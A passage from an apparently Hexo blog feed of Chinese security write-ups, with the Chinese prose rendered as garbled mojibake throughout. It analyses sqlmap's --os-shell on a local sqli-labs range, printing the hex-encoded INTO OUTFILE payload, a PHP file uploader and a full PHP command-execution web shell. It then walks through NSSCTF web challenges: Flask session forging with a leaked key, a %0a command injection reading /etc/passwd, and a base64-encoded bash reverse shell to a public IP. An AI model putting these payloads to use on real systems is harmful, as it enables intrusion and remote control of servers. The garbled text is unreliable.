alt="image-20230703135438853"><br>ææƒæˆåŠŸï¼Œæ‹¿åˆ°flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354139.png" alt="image-20230703135449069"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap --os-shellåŸç†åˆ†æ</title>
      <link href="/2023/06/Sqlmap-os-shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2023/06/Sqlmap-os-shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h2><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯æœ¬åœ°æ­å»ºçš„sqllabé¶åœºï¼Œæ­å»ºè¿™ä¸ªé¶åœºå¦‚æœé‡åˆ°æ•°æ®åº“åŠ è½½ä¸æˆåŠŸå¤§æ¦‚ç‡åŸå› ä¸ºphpç‰ˆæœ¬é—®é¢˜ï¼Œphpç‰ˆæœ¬å¿…é¡»ä¸º5.xå› ä¸º7ä»¥ä¸Šä¸æ”¯æŒ<code>mysql_connect</code>å‡½æ•°ç”¨çš„æ˜¯<code>mysqli_connect</code></p><h2 id="å¼€å§‹æ³¨å…¥"><a href="#å¼€å§‹æ³¨å…¥" class="headerlink" title="å¼€å§‹æ³¨å…¥"></a>å¼€å§‹æ³¨å…¥</h2><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹<code>--os-shell</code>ä¸€ç›´å†™ä¸è¿›å»é©¬ï¼Œè¿˜ä»¥ä¸ºæ˜¯æˆ‘è·¯å¾„çš„é—®é¢˜ï¼Œåé¢å‘ç°æ˜¯<code>secure_file_priv=</code>å¿…é¡»ä¸ºç©ºè¿™ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œphpstudyæ•°æ®åº“é‡Œé¢æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥åŠ ä¸Šå°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048382.png" alt="image-20230616204823343"><br>å¼€å§‹sqlæ³¨å…¥ï¼Œå…ˆæŠ“å–ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç„¶åå…³é—­æ‹¦æˆªï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥åœ¨burpä¸ŠæŠ“å–åˆ°æ‰€æœ‰çš„æ•°æ®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.102/sqli-labs-master/Less-1/?id=1&quot; --os-shell --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048866.png" alt="image-20230616204835828"><br>å…·ä½“å‚æ•°é€‰æ‹©å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048412.png" alt="image-20230616204846342"><br>æ‹¿åˆ°shell</p><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>æˆ‘ä»¬ä»ä¸‹é¢æ•°æ®åŒ…å¼€å§‹åˆ†æï¼Œå‰é¢çš„éƒ½æ˜¯æ­£å¸¸æ³¨å…¥çš„è¿‡ç¨‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048240.png" alt="image-20230616204857182"><br>è¿™é‡Œgetæ–¹å¼ä¼ å…¥äº†ä¸€å¤§å †urlç¼–ç çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041%27%20OR%209362%3D9362%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27D%3A%2Fphpstudy_pro%2FWWW%2Fsqli-labs-master%2FLess-1%2Ftmpuqmdh.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-</span><br></pre></td></tr></table></figure><p>è§£ç ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041&#x27; OR 9362=9362 LIMIT 0,1 INTO OUTFILE &#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -</span><br></pre></td></tr></table></figure><p>å‰é¢ä¸€æ¡æ˜¯æ­£å¸¸çš„sqlè¯­å¥ï¼Œåé¢æ˜¯åå…­è¿›åˆ¶æ•°æ®ï¼ŒæŠŠè¿™ä¸ªå†è§£ç ä¸€ä¸‹,è§£å‡ºæ¥æ˜¯phpä»£ç ï¼Œæ•´ç†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>() &lt; <span class="string">&#x27;4.1.0&#x27;</span>) &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>, <span class="number">0755</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] . <span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;  </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹å‰é¢çš„sqlè¯­å¥å«ä¹‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;Y0n3er&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥å…¶å®å°±æ˜¯åœ¨æŒ‡å®šè·¯å¾„ä¸‹å†™å…¥Y0n3erï¼Œ<code>LINES TERMINATED BY</code>å‚æ•°ç”¨äºæŒ‡å®šå°†å¼•å·å†…çš„å†…å®¹ä½œä¸ºç»ˆæ­¢ç¬¦ï¼Œä½†æ˜¯è¿™æ ·å¯ä»¥å°†æŒ‡å®šçš„å†…å®¹å†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/test.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;Y0n3er&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049896.png" alt="image-20230616204911858"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049822.png" alt="image-20230616204920783"><br>æˆåŠŸå†™å…¥è¿›å»ï¼Œç»“åˆä¸Šé¢çš„ä»£ç åˆ†æï¼Œå…¶å®è¿™ä¸ªå‘½ä»¤å°±æ˜¯å†™ä¸€ä¸ªç”¨äºæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•<code>tmpuqmdh.php</code>æ–‡ä»¶ï¼Œç»§ç»­åˆ†æï¼Œæ‰¾åˆ°äº†35è¿™ä¸ªæ•°æ®åŒ…ï¼Œé‡Œé¢é€šè¿‡postè®¿é—®ä¸Šä¼ äº†ä¸€ä¸ª<code>tmpbkdyk.php</code>æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049628.png" alt="image-20230616204929561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];  </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="number">0</span>);  </span><br><span class="line"><span class="variable">$z</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="keyword">array</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), <span class="variable">$t</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;  </span><br><span class="line">        <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>], <span class="number">512</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, r);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">            <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>, <span class="number">512</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">array</span>();  </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$w</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$w</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å¤§æ¦‚å°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç„¶åè¾“å‡ºç»“æœï¼Œè‡³æ­¤æ•´ä¸ªè¿‡ç¨‹å°±å·®ä¸å¤šç»“æŸäº†ï¼Œå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹å­˜åœ¨å‡ ä¸ªåé—¨æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•ä»£ç ï¼Œåº”è¯¥æ˜¯æˆ‘å¤šæ‰§è¡Œäº†ä¸€æ¬¡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049508.png" alt="image-20230616204942475"></p><h2 id="é™åˆ¶æ¡ä»¶"><a href="#é™åˆ¶æ¡ä»¶" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸‰ä¸ªæ¡ä»¶ï¼š</span><br><span class="line">1.å…·æœ‰rootæƒé™ã€‚</span><br><span class="line">2.åœ¨æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­çš„ é…ç½®é¡¹å«æœ‰ï¼šsecure_file_priv=&#x27;&#x27;ã€‚ï¼ˆæ³¨æ„åœ¨æ•°æ®åº“ä¸­æ­¤é¡¹é»˜è®¤ä¸ºsecure_file_priv=nullï¼‰ã€‚</span><br><span class="line">3.çŸ¥é“æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯é‚£ä¸ªå†™å…¥æ¡ä»¶ï¼Œå¦å¤–phpä¸»åŠ¨è½¬ä¹‰å¾—å…³é—­ï¼ŒGPCä¸ºoffï¼Œä½†æ˜¯GPCè¿™ä¸ªåœ¨åé¢çš„phpç‰ˆæœ¬éƒ½åˆ é™¤äº†ç”¨æˆ·å¯ä»¥è‡ªå·±æ§åˆ¶ï¼Œå³<code>magic_quotes_gpc</code>è¿™ä¸ªé€‰é¡¹ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸Šé¢ä¸‰ä¸ªæ¡ä»¶</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ†æä¸€éå‘ç°åŸç†ä¸æ˜¯å¾ˆéš¾ï¼Œ ä½†æ˜¯è¿™ä¸ªåˆ©ç”¨èµ·æ¥å¾ˆéš¾ï¼Œè¦æ±‚å¤ªé«˜äº†</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">sqlmap â€“os-shell åŸç†è¯¦è§£_osâ€“shell_ZredamanJçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#13 Web</title>
      <link href="/2023/06/NSSCTFRound-13-Web/"/>
      <url>/2023/06/NSSCTFRound-13-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ç‚¹æ„Ÿå¹"><a href="#ä¸€ç‚¹æ„Ÿå¹" class="headerlink" title="ä¸€ç‚¹æ„Ÿå¹"></a>ä¸€ç‚¹æ„Ÿå¹</h2><p>æœ€è¿‘å¾ˆçƒ¦ï¼Œæ¯”èµ›å¾ˆç®€å•çš„é¢˜ä¹Ÿåšä¸å‡ºæ¥å¤©å¤©çˆ†0ï¼Œä¼°è®¡æ˜¯åŸºç¡€æ²¡æ‰“ç‰¢å§ï¼Œé‡æ–°å›å»åˆ·åŸºç¡€é¢˜</p><h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>æ³¨å†Œè´¦å·å‘ç°adminå·²ç»å­˜åœ¨ï¼Œç„¶åéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·å‘ç°adminæ‰èƒ½getFlagï¼Œå°±æ˜¯ä¼ªé€ sessionäº†<br>åœ¨å¿˜è®°å¯†ç å‘é€é‚®ä»¶é‚£é‡ŒæŠ“åŒ…æ‰¾åˆ°key<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042149273.png" alt="image-20230604214829222"><br>ç„¶åå°±æ˜¯ä¼ªé€ sessionäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s th3f1askisfunny -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s th3f1askisfunny -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ªsessionå»getFlagå³å¯</p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>ç‚¹å‡»Toolå‘ç°å°†114514åˆ†è§£äº†ï¼Œä½¿ç”¨<code>%0a</code>æˆªæ–­å°†å‰é¢çš„å‘½ä»¤æˆªæ–­åé¢æ‹¼æ¥è¦æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0acat%20%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>/</code>ä¹Ÿè¦è¿›è¡Œurlç¼–ç ï¼Œä¸ç„¶ä¼šè¢«å½“åšæ–‡ä»¶ç›®å½•ï¼Œæ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯<code>cat /flag</code>å‡ºç°ä¸€å †æ•°å­—è¯»å‡ºæ¥ä¸å¥½è¯»ç›´æ¥åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0aecho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDMuOTkuMTYwLzY2NjYgMD4mMQ==|base64 -d|bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150726.png" alt="image-20230604215000673"></p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æŠ“ä¸ªåŒ…å‘ç°æœ‰ä¸ªApache&#x2F;2.4.55webæœåŠ¡å™¨ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰ä¸ªCVEï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/12345#toc-7">CVE-2023-25690 Apache HTTP Server è¯·æ±‚èµ°ç§æ¼æ´ åˆ†æä¸åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a><br>ç„¶åæˆ‘ä»¬è¯»å–index.phpå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¯»å–<code>/usr/local/apache2/conf/httpd.conf</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150738.png" 